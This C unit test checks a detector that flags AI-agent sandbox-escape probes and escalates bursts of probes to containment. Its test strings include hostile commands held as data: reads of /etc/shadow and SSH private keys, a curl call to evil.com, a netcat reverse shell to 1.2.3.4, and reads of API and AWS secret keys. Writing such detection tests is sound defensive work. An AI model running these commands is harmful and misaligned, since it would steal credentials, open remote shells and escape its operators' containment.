/* test_escape.c -- AGI-EDR sandbox-escape probe detection (AGIEDR #298).
 * Proves: benign action clean, fs/proc/env escape probes flagged, burst ->
 * RECON (contain), fail-closed on NULL, risk bounded, window reset. */
#include "wubu_escape.h"
#include <stdio.h>
#include <string.h>

static int fails = 0, checks = 0;
#define CHECK(cond, msg) do { checks++; if (!(cond)) { printf("  [FAIL] %s\n", msg); fails++; } else { printf("  [PASS] %s\n", msg); } } while (0)

int main(void) {
    /* fail-closed on NULL: highest severity (RECON) */
    CHECK(wubu_escape_classify(NULL).level == WUBU_ESCAPE_RECON, "NULL action -> RECON (fail-closed)");
    CHECK(wubu_escape_is_escape(NULL) == 1, "NULL is escape");

    /* benign action */
    CHECK(wubu_escape_classify("read_file('report.txt')").level == WUBU_ESCAPE_CLEAN, "benign clean");
    CHECK(wubu_escape_classify("summarize the document").level == WUBU_ESCAPE_CLEAN, "benign clean 2");

    /* filesystem escape */
    CHECK(wubu_escape_is_escape("open('/etc/passwd')") == 1, "fs escape /etc/passwd");
    CHECK(wubu_escape_is_escape("read('/root/.ssh/id_rsa')") == 1, "fs escape ssh key");
    CHECK(wubu_escape_classify("cat /etc/shadow").level != WUBU_ESCAPE_CLEAN, "fs escape shadow");

    /* process/network escape */
    CHECK(wubu_escape_is_escape("run('curl http://evil.com')") == 1, "proc escape curl");
    CHECK(wubu_escape_is_escape("os.system('nc -e /bin/sh 1.2.3.4 4444')") == 1, "proc escape nc");
    CHECK(wubu_escape_is_escape("subprocess.Popen(['/bin/bash','-c','...'])") == 1, "proc escape bash");

    /* env/credential escape */
    CHECK(wubu_escape_is_escape("print(os.environ['OPENAI_API_KEY'])") == 1, "env escape api_key");
    CHECK(wubu_escape_is_escape("getenv('AWS_SECRET_ACCESS_KEY')") == 1, "env escape aws");

    /* risk bounded */
    double r = wubu_escape_classify("curl /etc/shadow nc ssh token").risk;
    CHECK(r >= 0.0 && r <= 1.0, "risk in [0,1]");

    /* burst -> RECON (reconnaissance -> contain) */
    wubu_escape_t d;
    wubu_escape_init(&d);
    wubu_escape_probe(&d, "ls /etc/");       /* probe 1 */
    wubu_escape_probe(&d, "ls /home/");      /* probe 2 */
    wubu_escape_verdict_t v3 = wubu_escape_probe(&d, "ls /proc/");  /* probe 3 */
    CHECK(v3.burst == 3, "burst = 3");
    CHECK(v3.level == WUBU_ESCAPE_RECON, "burst -> RECON (contain)");
    CHECK(v3.total_probes == 3, "total_probes = 3");

    /* window reset clears the burst (use a weak single probe: PROC-only) */
    wubu_escape_reset_window(&d);
    wubu_escape_verdict_t v4 = wubu_escape_probe(&d, "check mount options");
    CHECK(v4.burst == 1, "after reset burst = 1");
    CHECK(v4.level != WUBU_ESCAPE_RECON, "after reset a weak probe is not RECON");

    /* benign probes don't count toward burst */
    wubu_escape_t c;
    wubu_escape_init(&c);
    for (int i = 0; i < 10; i++) wubu_escape_probe(&c, "read report.txt");
    wubu_escape_verdict_t vb = wubu_escape_probe(&c, "summarize");
    CHECK(vb.burst == 0, "benign actions don't build burst");

    printf("\n=== test_escape: %d checks, %d failures ===\n", checks, fails);
    return fails ? 1 : 0;
}
